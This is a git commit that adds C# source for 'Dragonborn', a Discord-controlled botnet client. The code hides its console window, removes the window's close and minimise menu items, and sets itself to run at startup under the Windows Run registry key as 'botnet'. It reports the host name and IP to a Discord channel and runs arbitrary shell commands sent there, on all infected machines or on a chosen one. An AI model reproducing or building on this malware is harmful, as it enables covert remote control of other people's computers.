cd18f22b24c383e21a58ee5dd8408359b8c5dda0
retardpa1n <74207477+retardpa1n@users.noreply.github.com>
2021-05-23 15:33:22 +0300

    Add files via upload

---
+++ Dragonborn/Core/Commands.cs
@@ -0,0 +1,53 @@
+﻿using Discord;
+using Discord.WebSocket;
+using System;
+using System.Collections.Generic;
+using System.IO;
+using System.Linq;
+using System.Net;
+using System.Runtime.InteropServices;
+using System.Text;
+using System.Threading.Tasks;
+using System.Net;
+using System.Net.Sockets;
+
+namespace Dragonborn
+{
+    class Commands
+    {
+        [DllImport("msvcrt.dll")]
+        public static extern int system(string cmd);
+
+        static ulong channelid = 1123123123123123123; //channel id
+        static string host = Dns.GetHostName();
+        static IPAddress ip = Dns.GetHostByName(host).AddressList[0];
+
+        public static async Task MessageReceived(SocketMessage message)
+        {
+            if (message.Channel.Id == channelid && message.Content.Contains("!dragonborn ")) 
+            {             
+                string arg = message.Content.Remove(message.Content.IndexOf("!dragonborn"), "!dragonborn".Length);
+
+                if (arg.Contains(" /l"))
+                {
+                    arg = arg.Remove(arg.IndexOf(" /l"), " /l".Length);
+                    await message.Channel.SendMessageAsync("[DRAGONBORN] PC: " + host + " IP: " + ip.ToString());
+                }
+
+                if (arg.Contains(" /t ALL /c "))
+                {
+                    string cmd = arg.Remove(arg.IndexOf(" /t ALL /c "), " /t ALL /c ".Length);
+                    system(cmd);
+                }
+
+                if (arg.Contains(" /t " + host + " /c "))
+                {
+                    string del = " /t " + host + " /c ";
+                    string cmd = arg.Remove(arg.IndexOf(del), del.Length);
+
+                    system(cmd);
+                }
+            }
+        }
+    }
+}
---
+++ Dragonborn/Core/Program.cs
@@ -0,0 +1,77 @@
+﻿using Discord;
+using Microsoft.Win32;
+using Discord.WebSocket;
+using System;
+using System.Collections.Generic;
+using System.Linq;
+using System.Runtime.InteropServices;
+using System.Text;
+using System.Threading.Tasks;
+using System.IO;
+using System.Threading;
+using System.Diagnostics;
+
+namespace Dragonborn
+{
+    class Program
+    {
+        [DllImport("kernel32.dll")]
+        private static extern IntPtr GetConsoleWindow();
+
+        [DllImport("user32.dll")]
+        private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
+
+        [DllImport("user32.dll")]
+        private static extern int DeleteMenu(IntPtr hMenu, int nPosition, int wFlags);
+
+        [DllImport("user32.dll")]
+        private static extern IntPtr GetSystemMenu(IntPtr hWnd, bool bRevert);
+
+        private static DiscordSocketClient _client;
+        private string token = "token";
+        private int yourDick;
+        private long myDick;
+
+        public static void Main(string[] args)
+        {
+            DeleteMenu(GetSystemMenu(GetConsoleWindow(), false), 0xF060, 0x00000000);
+            DeleteMenu(GetSystemMenu(GetConsoleWindow(), false), 0xF030, 0x00000000);
+            DeleteMenu(GetSystemMenu(GetConsoleWindow(), false), 0xF020, 0x00000000);
+            DeleteMenu(GetSystemMenu(GetConsoleWindow(), false), 0xF130, 0x00000000);
+
+            ShowWindow(GetConsoleWindow(), 0);
+            Console.Title = "";
+            SetAutorunValue(true);
+            new Program().MainAsync().GetAwaiter().GetResult();
+        }
+
+        public async Task MainAsync()
+        {
+            _client = new DiscordSocketClient();
+            await _client.LoginAsync(TokenType.Bot, token);
+            await _client.StartAsync();
+            _client.MessageReceived += Commands.MessageReceived;
+
+            await Task.Delay(-1);
+        }
+
+        public static bool SetAutorunValue(bool autorun)
+        {
+            RegistryKey reg = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run\\");
+            try
+            {
+                if (autorun)
+                    reg.SetValue("botnet", Directory.GetCurrentDirectory() + "/" + "botnet.exe");
+                else
+                    reg.DeleteValue("botnet");
+
+                reg.Close();
+            }
+            catch
+            {
+                return false;
+            }
+            return true;
+        }
+    }
+}
